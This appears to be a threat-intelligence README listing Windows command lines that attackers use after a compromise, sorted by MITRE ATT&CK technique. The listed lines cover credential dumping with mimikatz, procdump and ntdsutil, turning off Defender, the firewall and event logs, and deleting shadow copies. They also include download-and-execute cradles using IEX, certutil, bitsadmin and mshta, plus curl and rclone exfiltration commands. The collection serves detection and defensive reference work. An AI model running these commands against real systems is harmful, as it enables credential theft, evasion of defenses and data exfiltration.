# ThreatActorProcedures-MITRE-ATTACK

Threat actor procedures (the “P” in TTPs) are specific implementations of the tactics and techniques outlined in the [MITRE ATT&CK framework](https://attack.mitre.org/). They are the specific actions that threat actors take on a system or network after they have gained access. These actions often involve the use of command line activities.

These behaviors are specific procedural implementations of broader techniques that adversaries use to accomplish their goals. These techniques, such as System Network Configuration Discovery or Process Discovery, are linked to specific actions that illustrate how these techniques are implemented in real-world scenarios.

This is an ongoing collection of commands used by threat actors to perform various actions on a compromised system, accompanied by their respective MITRE ATT&CK technique reference numbers.

---

System Information Discovery [[T1082](https://attack.mitre.org/techniques/T1082/)]
<br>
```
systeminfo
net config workstation
tasklist /svc
ping -n 1 <remote_host>
net view
wmic product get name
wmic os caption
wmic process | find <security_product_process>
wmic volume list brief
wmic service brief
wmic product list brief
wmic baseboard list full
netsh interface firewall show all
netsh interface portproxy show all
netsh interface portproxy show v4tov4
netsh firewall show all
netsh portproxy show v4tov4
reg query hklm\software\
```
<br>

System Network Connections Discovery [[T1049](https://attack.mitre.org/techniques/T1049/)]

```
ipconfig /all
route print
arp -a
netstat -an
qwinsta
nslookup MACHINE_DOMAIN_NAME
```
<br>

Account Discovery: Domain Account (Active Directory) [[T1087.002](https://attack.mitre.org/techniques/T1087/002/)]

```
net accounts /domain
net user <user_name> /domain
net user Administrator /domain
nltest dclist:
nltest /domain_trusts /all_trusts
net config workstation
net groups /domain
net group "domain controllers" /domain
net group "Domain Admins" /domain
net group "domain computers" /domain
net group "enterprise admins" /dom
net localgroup "administrators" /dom
net time /domain
net share
setspn.exe -F -Q */*
dsquery group -name "<groupname>" | dsget group -members
Get-MsolUser <user>
Get-MsolUser -UserPrincipalName <user>
adfind -gcb -sc trustdmp 
adfind f "(objectcategory=group)" 
adfind -subnets -f (objectCategory=subnet)
adfind -f (objectcategory=organizationalUnit) 
adfind -f objectcategory=computer -csv name operatingSystem 
adfind -f objectcategory=computer 
adfind -f (objectcategory=person)
adexplorer -snapshot
```
<br>

Domain Trust Discovery [[T1482](https://attack.mitre.org/techniques/T1482/)]

```
nltest /domain_trusts
nltest /dclist:<victim_domain>
netdom trust <domain_name>
dsquery * -filter "(objectClass=trustedDomain)"
net view /domain
dsget domain <domain_name> -trus
Get-ADTrust -Filter *
Get-NetDomainTrust
Get-ADDomainController -Discover
Test-NetConnection -ComputerName <domain_controller_name>
Get-NetForestDomain
Get-ADDomain <domain_name> | Select-Object Name, Trusts
Get-ADTrustRelationship -Domain <domain_name>
```
<br>

Query Registry [[T1012](https://attack.mitre.org/techniques/T1012/)]

```
reg query
hkcu\<domain_user_sid>\Software\Microsoft\Office\14.0\ Outlook /s | find "<victim_domain_name>"
cmd /c tasklist
wmic process | find "<process_name>"
```
<br>

Remote System Discovery [[T1018](https://attack.mitre.org/techniques/T1018/)]

```
cmd /c wmic product get name
dir \\<ip>\c$\windows\system32\tasks
ping <domain_name>
ping <ip_address>
```

```
(&(&(&(objectClass=Computer)(dnshostname=*))(operatingsystem=*))(servicePrincipalName=*))
```
<br>

Network Share Discovery [[T1135](https://attack.mitre.org/techniques/T1135/)]

```
cmd.exe /C net group "domain admins" /domain"
cmd.exe /C net group /d
```
<br>

Permission Groups Discovery [[T1069](https://attack.mitre.org/techniques/T1069/)]

```
net group "domain computers" /do
```
<br>

Domain Trust Discovery [[T1482](https://attack.mitre.org/techniques/T1482/)]

```
nltest /dclists
nltest /domain_trusts
nltest /dclist:<domain>
```
<br>

OS Credential Dumping: LSASS Memory [[T1003.001](https://attack.mitre.org/techniques/T1003/001/)]

```
procdump.exe -accepteula -ma lsass.exe С:\Windows\Temp\mem.dmp
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\mem.dmp
cmd.exe /C tasklist /svc | findstr lsass
rundll32.exe c:\Windows\System32\comsvcs.dll, MiniDump ((Get-Process lsass).Id) C:\windows\temp\lsass.dmp full
```
<br>

OS Credential Dumping: MimiKatz [[T1003.001](https://attack.mitre.org/techniques/T1003/001/)]

```
msdol.exe privilege::debug sekurlsa::logonpasswords exit
sekurlsa::Minidump lsassdump.dmp
cmd.exe /C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > "c:\pathtooutfile\<output_file>.txt"
cmd.exe powershell -ep bypass -C "import-module .\katz.ps1;Invoke-Katz" > <output_file>.txt
```
<br>

OS Credential Dumping: Security Account Manager [[T1003.002](https://attack.mitre.org/techniques/T1003/002/)]

```
reg save hklm\sam sam.hive
reg save hklm\system sys
reg save hklm\security sec
```
<br>

Process Discovery [[T1057](https://attack.mitre.org/techniques/T1057/)]

```
tasklist.exe /svc
powershell.exe Get-Process
```
<br>

System Network Configuration Discovery: Internet Connection Discovery [[T1016](https://attack.mitre.org/techniques/T1016/)]

```
ping.exe -n 1 -a <ip_address>
```
<br>

System Owner/User Discovery [[T1033](https://attack.mitre.org/techniques/T1033/)]

```
whoami
whoami /all
whoami /upn
quser.exe quser
quser.exe whoami
net user
net user <username>
net user /domain
net user <username> /domain
```
<br>

Steal or Forge Kerberos Tickets: Kerberoasting [[T1558.003](https://attack.mitre.org/techniques/T1558/003/)]

```
powershell.exe $Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search = New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter = '(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall(); foreach ( $results in $results ) { $u = $results.GetDirectoryEntry(); 
samAccountName = $u.samAccountName; foreach ( $s in $u.servicePrincipalName )
```
<br>


Event Triggered Execution: Image File Execution Options Injection [[T1546.012](https://attack.mitre.org/techniques/T1546/012/)]

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<target_file>.exe" /v Debugger /d "<threat_actor_file>.<ext>"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<target_file>.exe" /v GlobalFlag /t REG_DWORD /d <GlobalFlag_registry_entry_value>
```
<br>


Lateral Tool Transfer via SMB [[T1570](https://attack.mitre.org/techniques/T1570/)]

```
cmd.exe /C copy * \\<remote_ip>\C$\windows\destination\folder
```
<br>

Exfiltration Over Web Service [[T1567](https://attack.mitre.org/techniques/T1567/)]

```
cmd.exe /C curl -F "file=@$selfpath\<filename>.rar" --ssl-no-revoke https[:]//<web_service>.io
```
<br>

Impair Defenses: Disable or Modify Tools [[T1562.001](https://attack.mitre.org/techniques/T1562/001/)]

```
PowerShell -exec bypass -command Set-MpPreference -DisableRealtimeMonitoring $True
"$windir\$system32\WindowsPowerShell\v1.0\PowerShell.exe" Add-MpPreference -ExclusionPath "\$path\to\file.ext"
﻿schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -Disable IOAVProtection $true
Set-MpPreference -Disable Intrusion PreventionSystem $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -MAPSReporting
Set-MpPreference -DisableCatchupFullScan $True
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 0x1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting" /t REG_DWORD /d 0x0 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 0x2 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "NotificationSuppress" /t REG_DWORD /d 0x1 /fe
powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI
```
<br>

Create or Modify System Process: Windows Service [[T1543.003](https://attack.mitre.org/techniques/T1543/003/)]

```
sc <server_IP> create <service_name> <option1> <option2>
sc <server_IP> config <service_name> binpath= “<path_to_executable>”
sc <service_name> binpath= “<path_to_executable>”
```
<br>

Ingress Tool Transfer [[T1105](https://attack.mitre.org/techniques/T1105/)]

```
powershell.exe -exec bypass -C IEX ((New-Object Net.WebClient).downloadstring('http[:]//<url>/file.ext'))
powershell.exe -exec bypass -C IEX ((new-object net.webclient).downloadstring('http[:]//<url>/file.ext'))
powershell.exe -exec bypass -C IEX ((new-object net.tneilCbeW).daolnwoDstring('http[:]//<url>/file.ext'))
powershell.exe -exec bypass -C IN`V`o`Ke-eXp`ResSIOn (Ne`W-ob`ject Net.WebClient).DownloadString('http[:]//<url>/file.ext'))
powershell.exe Invoke-WebRequest -Uri "https[:]//<url>/file.ext" -OutFile c:\file.ext -UseBasicParsing"
powershell.exe iwr -Uri "https[:]//<url>/file.ext" -OutFile c:\<output_file>.ext -UseBasicParsing"
сmd.exe /c PowerShell iwr -Uri http://<IP_address>:<port>/<file_name>.ext -OutFile c:\<output_file>.ext -UseBasicParsing
PowerShell -Command $wc = New-Object System.Net.WebClient; $tempfile = [System.
IO.Path]::GetTempFileName(); $tempfile += '.<ext>'; $wc.DownloadFile('[URL]', $tempfile); & 
$tempfile ; Remove-Item -Force $tempfile
powershell.exe -exec bypass -C Invoke-WebRequest "http:/<IP_address>:<port>/<file_name>.ext" -OutFile "<output_file>.ext"
powershell.exe -C wget "http[:]//<IP_address>:<port>/<file_name>.ext" -OutFile "<output_file>.ext"
cmd.exe /c certutil -urlcache -split -f hxxp[:]//<IP_address>:<port>/<file_name>.ext $path\to\outfile\<output_file>.ext
```
<br>

Indicator Removal: Clear Windows Event Logs [[T1070.001](https://attack.mitre.org/techniques/T1070/001/)]

```
wevtutil cl system
wevtutil cl security
wevtutil cl application
```
<br>

Remote Services: SMB/Windows Admin Shares [[T1021.002](https://attack.mitre.org/techniques/T1021/002/)]

```
net use \\<remote ip> "<password>" /u:<domain>\<username>
```
<br>

Scheduled Task/Job: Scheduled Task [[T1053.005](https://attack.mitre.org/techniques/T1053/005/)]

```
schtasks /s <remote_host> /tn <task_name> /u <domain>\<username> /p <password> /create /ru system /sc
schtasks /create -s <remote> /tn <task_name> /tr <path_to_executable> /sc <schedule_type> /st <start_time>
```
<br>

Indicator Removal: Clear Persistence [[T1070.009](https://attack.mitre.org/techniques/T1070/009/)]

```
schtasks /s <remote_host> /tn one /u <domain>\<username> /p <password> /f /delete
```
<br>

OS Credential Dumping: NTDS [[T1003.003](https://attack.mitre.org/techniques/T1003/003/)]

```
wmic process call create "ntdsutil \"ac i ntds\" ifm \"create full <file_path>
wmic process call create "ntdsutil \"activate instance ntds\" ifm \"create full <file_path>
wmic process call create "cmd.exe /c ntdsutil \"ac i ntds\" ifm \"create full <file_path>
wmic process call create "cmd.exe /c mkdir <file_path> & ntdsutil \"ac i ntds\" ifm \"create full <file_path>
ntdsutil.exe 'ac i ntds' 'ifm' 'create full С:\Windows\temp\<folder>' q q
ntdsutil.exe 'activate instance ntds' 'ifm' 'create full С:\Windows\temp\<folder>' q q
```
<br>

Network Share Connection Removal [[T1070.005](https://attack.mitre.org/techniques/T1070/005/)]

```
net use * /delete /y
```
<br>

File and Directory Discovery [[T1083](https://attack.mitre.org/techniques/T1083/)]

```
echo list volume | diskpart
echo lis vol | diskpart
wmic /node:<IP_address> /user:"<user>" /password:"<password>" logicaldisk get caption,description,drivetype,providername,volumename
Get-CimInstance win32_logicaldisk
```
<br>

BITS Jobs [[T1197](https://attack.mitre.org/techniques/T1197/)]

```
cmd.exe /c bitsadmin /transfer n http[:]//<IP_address>:<port>/<file_name>.ext $public\Downloads\<output_file>.ext
powershell.exe Start-BitsTransfer -Source http[:]//<IP_address>/pathto/<file_name>.ext -Destination C:\\Users\\pathtofile\\<output_file>.ext -transfertype download
```
<br>

System Services: Service Execution [[T1569.002](https://attack.mitre.org/techniques/T1569/002/)]

```
sc.exe \\TARGET start <service_name>
```
<br>

Credentials from Password Stores: Credentials from Web Browsers [[T1555.003](https://attack.mitre.org/techniques/T1555/003/)]

```
cmd.exe /Q /c esentutl.exe /y
```

```
**Google Chrome**
$user\$appdata\Google\Chrome\User Data\.*\Bookmarks
$user\$appdata\Google\Chrome\User Data\.*\Cookies
$user\$appdata\Google\Chrome\User Data\.*\Login Data
$user\$appdata\Google\Chrome\User Data\.*\Web Data
$user\$appdata\Google\Chrome\User Data\.*\Web Data-journal
$user\$appdata\Google\Chrome\User Data\Local State

**Mozilla Firefox**
$user\$appdata\Mozilla\Firefox\Profiles\.*\cookies
$user\$appdata\Mozilla\Firefox\Profiles\.*\key3.db
$user\$appdata\Mozilla\Firefox\Profiles\.*\key4.db
$user\$appdata\Mozilla\Firefox\Profiles\.*\logins.json
$user\$appdata\Mozilla\Firefox\Profiles\.*\places.sqlite

**Opera**
$user\$appdata\Opera Software\Opera Stable\User Data\.*\Bookmarks
$user\$appdata\Opera Software\Opera Stable\User Data\.*\Cookies
$user\$appdata\Opera Software\Opera Stable\User Data\.*\Login Data
$user\$appdata\Opera Software\Opera Stable\User Data\.*\Web Data
$user\$appdata\Opera Software\Opera Stable\User Data\Local State
$user\$appdata\Opera\Opera Next\User Data\.*\Bookmarks
$user\$appdata\Opera\Opera Next\User Data\.*\Cookies
$user\$appdata\Opera\Opera Next\User Data\.*\Login Data
$user\$appdata\Opera\Opera Next\User Data\.*\Web Data
$user\$appdata\Opera\Opera Next\User Data\Local State

**Microsoft Edge**
$user\$appdata\Microsoft\Edge\User Data\.*\Bookmarks
$user\$appdata\Microsoft\Edge\User Data\.*\Cookies
$user\$appdata\Microsoft\Edge\User Data\.*\Login Data
$user\$appdata\Microsoft\Edge\User Data\.*\Web Data
$user\$appdata\Microsoft\Edge\User Data\Local State
```
<br>

Windows Management Instrumentation [[T1047](https://attack.mitre.org/techniques/T1047/)]

```
gwmi
Get-WmiObject -Query “select * from Win32_Service”
Get-WmiObject -Class Win32_Service
Get-CimInstance -ClassName Win32_ComputerSystem
Get-WmiObject win32_processor
Get-WmiObject CIM_PhysicalMemory
Get-WmiObject –ComputerName <host> –Class Win32_ComputerSystem | Select-Object UserName
wmic.exe os get /FORMAT:”http://<IP_address>:<port>/ <file_name>.exe”
```
<br>

Device Driver Discovery [[T1652](https://attack.mitre.org/techniques/T1652/)]

```
powershell.exe Get-SystemDriver
```
<br>

System Service Discovery [[T1007](https://attack.mitre.org/techniques/T1007/)]

```
powershell.exe gsv
powershell.exe Get-Service
powershell.exe Get-CimInstance -ClassName Win32_Service
```

```
sc query <service_name>
```
<br>

Use Alternate Authentication Material: Pass the Hash [[T1550.002](https://attack.mitre.org/techniques/T1550/002/)]

```
<mimikatz>.exe "privilege::debug" "sekurlsa::logonpasswords" exit > <output_file>.txt
<mimikatz>.exe "privilege::debug" "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>" exit
```
* File name is often changed
<br>

Log Enumeration [[T1654](https://attack.mitre.org/techniques/T1654/)]

```
powershell.exe get-eventlog security
powershell.exe -c "get-eventlog 'Security'
```
<br>

Exfiltration Over Web Service: Exfiltration to Cloud Storage [[T1567.002](https://attack.mitre.org/techniques/T1567/002/)]

```
powershell.exe InvokeModule -module awscollector -awskey <key_value> -awssecret <aws_secret> -awss3bucket <domain> -awsregion <region> -handleSystems <target_host>
rclone.exe copy "\\SERVER.domain.name\path"
```
<br>

Inter-Process Communication [[T1559](https://attack.mitre.org/techniques/T1559/)]

```
\postex_*
\postex_ssh_*
\status_*
\msagent_*
\MSSE-*
\*-server
```
* Cobalt Strike named pipes
<br>

Create Account: Local Account [[T1136.001](https://attack.mitre.org/techniques/T1136/001/)]

```
net user sys <username> /add
net localgroup %AdmGroup% sys /add
```
<br>

Remote Services: Remote Desktop Protocol [[T1021.001](https://attack.mitre.org/techniques/T1021/001/)]

```
net localgroup "%RDPGroup%" sys /add
netsh advfirewall firewall add rule name= "Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```
<br>

Inhibit System Recovery [[T1490](https://attack.mitre.org/techniques/T1490/)]

```
wmic shadowcopy delete
powershell.exe -Command Get-WmiObject Win32_Shadowcopy | Remove-WmiObject
vssadmine delete shadows /all /quiet
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
```
<br>

Software Discovery: Security Software Discovery [[T1518.001](https://attack.mitre.org/techniques/T1518/001/)]

```
wmic /Node:localhost /Namespace:\\remotepath Path AntiVirusProduct Get * /Format:List
sc query WinDefend
```

```
Get-MpComputerStatus
```
<br>

Modify System Image [[T1601](https://attack.mitre.org/techniques/T1601/)]

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<vulnerable_service_name>" /v ImagePath /t REG_SZ /d "C:\pathto\<payload.ext>”
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControl001\Services\<vulnerable_service_name>" /v ImagePath /t REG_SZ /d "C:\pathto\<payload.ext>”
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControl002\Services\<vulnerable_service_name>" /v ImagePath /t REG_SZ /d "C:\pathto\<payload.ext>”
```
<br>

Impair Defenses: Disable or Modify System Firewall [[T1562.004](https://attack.mitre.org/techniques/T1562/004/)]

```
netsh advfirewall set currentprofile state off
netsh interface portproxy add v4tov4 listenaddress=<ip_address> listenport=<listening_port> connectaddress=<internal_ip_address> connectport=<connect_port> protocol=tcp”
netsh advfirewall firewall add rule dir=in name="<name>" program=<file_path> service=rpcss action=allow protocol=TCP localport=<port>
```
<br>

Obfuscated Files or Information [[T1027](https://attack.mitre.org/techniques/T1027/)]

```
powerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand <Base64_encoded_string>
```
<br>

System Binary Proxy Execution: Rundll32 [[T1218.011](https://attack.mitre.org/techniques/T1218/011/)]

```
rundll32 comsvcs.dll,MiniDump <PID> <file_name>.bin full
```
<br>

System Binary Proxy Execution: Mshta [[T1218.005](https://attack.mitre.org/techniques/T1218/005/)]

```
mshta.exe vbscript:(CreateObject("WScript.Shell").Run("<file_name>.exe",0)) (Window.Close)
mshta.exe http[:]//<IP_address>/<file_name>.hta
```
